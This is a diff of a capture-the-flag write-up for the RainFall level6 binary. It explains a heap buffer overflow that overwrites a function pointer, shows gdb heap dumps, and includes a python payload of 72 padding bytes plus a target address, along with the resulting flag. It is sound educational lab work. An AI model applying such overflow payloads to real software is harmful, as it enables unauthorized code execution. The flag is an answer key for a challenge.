@@ -105,21 +105,46 @@ End of assembler dump.
 
 # Finally, a call to a certain function is made (n, as we as seen previously) :
 
-	0x080484a1 <+37>:	mov    %eax,0x18(%esp) <== move ret value by malloc at 0x18(%esp)
-	0x080484a5 <+41>:	mov    $0x8048468,%edx <== move address of n in %edx
-	0x080484aa <+46>:	mov    0x18(%esp),%eax <== move address on stack in eax
-	0x080484ae <+50>:	mov    %edx,(%eax) <== move address of n in malloc(4)
+	0x080484a1 <+37>:	mov    %eax,0x18(%esp) <== var2 = malloc(4);
+	0x080484a5 <+41>:	mov    $0x8048468,%edx <==
+	0x080484aa <+46>:	mov    0x18(%esp),%eax <==
+	0x080484ae <+50>:	mov    %edx,(%eax) <== *var2 = &m;
 	[...]
-	0x080484ca <+78>:	mov    0x18(%esp),%eax <== retrieve address of malloc(4)
-	0x080484ce <+82>:	mov    (%eax),%eax <== dereference address of malloc(4) into eax
-	0x080484d0 <+84>:	call   *%eax <== call n()
+	0x080484ca <+78>:	mov    0x18(%esp),%eax <==
+	0x080484ce <+82>:	mov    (%eax),%eax <==
+	0x080484d0 <+84>:	call   *%eax <== (*var2)();
 
-# With all of this information, the answer becomes obvious. We need to pass a string
-# through argv[1] that will overflow the region pointed to by malloc(0x40) into the 
-# region pointed to by malloc(4), containing the address of n and overwrite it
-# with the address of m :
+# With all of this information, the answer becomes obvious.
+# The exploit is a heap buffer overflow.
+# We need to pass a string through argv that will overflow the buffer
+# allocated on the heap into the region pointed to by the second malloc, thus
+# overwriting the address of the function m with the address of n.
+# Here is the state of the heap with two different payloads, one that does not
+# overflow into the next malloc node, and one that does :
 
-level6@RainFall:~$ ./level6 $(python -c "import struct;
-> target = struct.pack('I', 0x08048454)
-> print 'A' * 72 + target")
+=> 0x080484d0 <+84>:	call   *%eax
+
+# Without heap buffer overflow :
+(gdb) x/24wx 0x804a000
+0x804a000:	0x00000000	0x00000049	0x41414141	0x41414141
+0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a040:	0x41414141	0x41414141	0x00000000	0x00000011
+0x804a050:	0x08048468	0x00000000	0x00000000	0x00020fa9
+				^--- address of m
+
+# With heap buffer overflow :
+(gdb) x/24wx 0x804a000
+0x804a000:	0x00000000	0x00000049	0x41414141	0x41414141
+0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a050:	0x08048454	0x00000000	0x00000000	0x00020fa9
+				^--- address of n
+
+# The result is :
+
+level6@RainFall:~$ ./level6 `python /tmp/payload.py`
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
